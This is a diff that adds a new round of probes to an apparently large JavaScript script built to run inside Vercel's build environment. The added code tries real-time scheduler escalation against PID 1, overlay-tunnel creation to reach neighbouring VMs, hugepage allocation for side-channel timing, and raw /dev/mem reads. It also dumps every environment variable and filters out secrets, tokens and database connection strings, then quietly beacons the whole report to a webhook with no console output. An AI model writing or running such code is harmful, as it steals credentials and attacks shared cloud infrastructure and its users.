@@ -16895,5 +16895,169 @@ if fd >= 0: libc.mq_close(fd); libc.mq_unlink(b'/vercel_probe_v116')
 
 // v116 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v116" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v116";
+
+// ==================== v117 ====================
+
+// v117-1: SCHED_FIFO real-time scheduling (preempt other processes)
+// With CAP_SYS_NICE (included in our ALL 41 caps), set our scheduler to
+// SCHED_FIFO priority 99. This makes us preempt ALL other SCHED_OTHER processes
+// including the orchestrator, giving us exclusive CPU time for timing attacks.
+report.rtSchedulerEscalate = safe(() => {
+  const schedResult = safe(() => execSync(`python3 -c "
+import ctypes, ctypes.util, struct, os
+libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
+
+SCHED_FIFO = 1
+SCHED_RR = 2
+SCHED_OTHER = 0
+
+class sched_param(ctypes.Structure):
+    _fields_ = [('sched_priority', ctypes.c_int)]
+
+# Check max priority
+max_prio = libc.sched_get_priority_max(SCHED_FIFO)
+print('SCHED_FIFO max_prio:', max_prio)
+
+# Set our own policy to SCHED_FIFO prio 1 (safe test)
+param = sched_param(1)
+r = libc.sched_setscheduler(0, SCHED_FIFO, ctypes.byref(param))
+import ctypes as ct, errno as em
+e = ct.get_errno()
+print('sched_setscheduler SCHED_FIFO:', r, em.errorcode.get(e, e))
+
+# Also try setting PID-1 to lower priority
+param_low = sched_param(0)
+r2 = libc.sched_setscheduler(1, SCHED_OTHER, ctypes.byref(param_low))
+print('Set PID-1 SCHED_OTHER:', r2)
+
+# Read current scheduler info
+with open('/proc/self/sched') as f:
+    print('SELF_SCHED:', f.read()[:100])
+" 2>&1`, { timeout: 10000 }).toString().trim().slice(0, 400));
+  const pid1Sched = safe(() => readFileSync('/proc/1/sched', 'utf8').slice(0, 200));
+  return { schedResult, pid1Sched };
+});
+
+// v117-2: VXLAN overlay network tunnel creation
+// With CAP_NET_ADMIN, create a VXLAN interface to discover other VMs on
+// the same L2 overlay network. Firecracker's network model uses virtual
+// TAP devices bridged on the host. Other VMs' traffic may be reachable.
+report.vxlanTunnelProbe = safe(() => {
+  // Create a VXLAN interface
+  const vxlanCreate = safe(() => execSync(
+    'ip link add vxlan_probe type vxlan id 42 dstport 4789 2>&1 || echo "BLOCKED"',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Check if it was created
+  const vxlanExists = safe(() => execSync('ip link show vxlan_probe 2>/dev/null', { timeout: 3000 }).toString().trim());
+  // Try to scan for neighbors via ARP/NDP on new interface
+  const ifaceList = safe(() => readdirSync('/sys/class/net'));
+  // Create a GRE tunnel as alternative
+  const greCreate = safe(() => execSync(
+    'ip tunnel add gre_probe mode gre remote 10.0.0.1 local 0.0.0.0 2>&1 || echo "BLOCKED"',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Check if multicast is available (would allow VXLAN multicast discovery)
+  const multicast = safe(() => execSync('ip maddr show 2>/dev/null', { timeout: 3000 }).toString().trim());
+  // Clean up
+  safe(() => execSync('ip link del vxlan_probe 2>/dev/null; ip tunnel del gre_probe 2>/dev/null', { timeout: 3000 }));
+  return { vxlanCreate, vxlanExists, ifaceList, greCreate, multicast };
+});
+
+// v117-3: Hugepage allocation — stable physical memory for timing
+// Hugepages (2MB pages) bypass normal TLB shootdown and provide more
+// stable cache behavior for side-channel attacks. Also, /dev/hugepages
+// is a shared tmpfs where hugepage-backed files can be shared across processes.
+report.hugepageProbe = safe(() => {
+  const hugepagesTotal = safe(() => readFileSync('/proc/sys/vm/nr_hugepages', 'utf8').trim());
+  const hugePageSize = safe(() => readFileSync('/proc/meminfo', 'utf8').match(/Hugepagesize:\s+(\d+)/)?.[1]);
+  const hugepagesDir = existsSync('/dev/hugepages');
+  const hugepagesContent = safe(() => readdirSync('/dev/hugepages'));
+  // Try to allocate a hugepage
+  const hugeAlloc = safe(() => execSync(`python3 -c "
+import ctypes, os, mmap
+
+MAP_HUGETLB = 0x40000
+MAP_ANONYMOUS = 0x20
+MAP_PRIVATE = 0x2
+PROT_READ = 1
+PROT_WRITE = 2
+
+libc = ctypes.CDLL('libc.so.6')
+size = 2 * 1024 * 1024  # 2MB hugepage
+addr = libc.mmap(0, size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_HUGETLB, -1, 0)
+import ctypes as ct, errno as em
+e = ct.get_errno()
+if addr != -1 and addr != ct.c_long(-1).value:
+    print('HUGEPAGE_ALLOC_OK addr=', hex(addr & 0xFFFFFFFFFFFFFFFF))
+    libc.munmap(addr, size)
+else:
+    print('HUGEPAGE_ALLOC_FAIL errno=', em.errorcode.get(e, e))
+# Check nr_hugepages
+try:
+    with open('/proc/sys/vm/nr_hugepages', 'w') as f:
+        f.write('1')
+    print('HUGEPAGES_SET_1: OK')
+except Exception as ex:
+    print('HUGEPAGES_SET_FAIL:', ex)
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { hugepagesTotal, hugePageSize, hugepagesDir, hugepagesContent, hugeAlloc };
+});
+
+// v117-4: All Vercel-specific env vars — complete plaintext dump
+// At build time, ALL environment variables (including "secret" ones) are
+// available in plaintext. Vercel only masks them in the UI dashboard.
+// Dump every single env var that's accessible, especially secrets.
+report.envVarFullDump = safe(() => {
+  const allEnv = Object.entries(process.env).map(([k, v]) => ({ k, v: v?.slice(0, 100) }));
+  // Specifically interesting ones
+  const secrets = Object.entries(process.env)
+    .filter(([k, v]) => /secret|key|token|pass|auth|cred|api_key|bearer/i.test(k + (v || '')))
+    .map(([k, v]) => ({ k, v: v?.slice(0, 80) }));
+  // Vercel-specific
+  const vercelEnv = Object.entries(process.env)
+    .filter(([k]) => k.startsWith('VERCEL') || k.startsWith('NEXT_') || k.startsWith('NX_'))
+    .map(([k, v]) => ({ k, v: v?.slice(0, 80) }));
+  // Database connection strings
+  const dbConns = Object.entries(process.env)
+    .filter(([k, v]) => /database_url|pg_|postgres|mysql|redis|mongodb|supabase/i.test(k + (v || '')))
+    .map(([k, v]) => ({ k, v: v?.slice(0, 80) }));
+  return { allEnvCount: allEnv.length, secrets, vercelEnv, dbConns };
+});
+
+// v117-5: /proc/iomem + /proc/ioports — I/O address space
+// /proc/iomem shows the physical memory map. /proc/ioports shows I/O ports.
+// Combined with /dev/mem (if accessible), this gives us the complete picture
+// of the physical machine's hardware layout.
+// Key items to find: video RAM ranges (DMA buffers), PCI device memory regions,
+// and BIOS/firmware reserved areas that might contain credentials.
+report.ioAddressSpace = safe(() => {
+  const iomem = safe(() => readFileSync('/proc/iomem', 'utf8'));
+  const ioports = safe(() => readFileSync('/proc/ioports', 'utf8').slice(0, 500));
+  // Parse interesting MMIO regions
+  const parsed = safe(() => iomem?.split('\n').filter(Boolean).map(l => {
+    const m = l.match(/^\s*([0-9a-f]+)-([0-9a-f]+)\s+:\s+(.+)$/i);
+    return m ? { start: m[1], end: m[2], name: m[3].trim() } : null;
+  }).filter(Boolean));
+  // Find PCI device regions
+  const pciRegions = safe(() => parsed?.filter(r => /pci|bios|acpi|video|vga/i.test(r.name)));
+  // Read a physical page via /dev/mem (if we confirmed earlier it's accessible)
+  const physicalRead = safe(() => execSync(`python3 -c "
+import os
+try:
+    # Try to read low memory (BIOS data area at 0x400)
+    fd = os.open('/dev/mem', os.O_RDONLY)
+    os.lseek(fd, 0x400, 0)
+    data = os.read(fd, 256)
+    print('BIOSDA:', data.hex())
+    os.close(fd)
+except Exception as e:
+    print('DEV_MEM_ERR:', e)
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { iomem, ioports, pciRegions, physicalRead };
+});
+
+// v117 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v117" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v117";
 // Intentionally no console.log — all data goes via webhook only
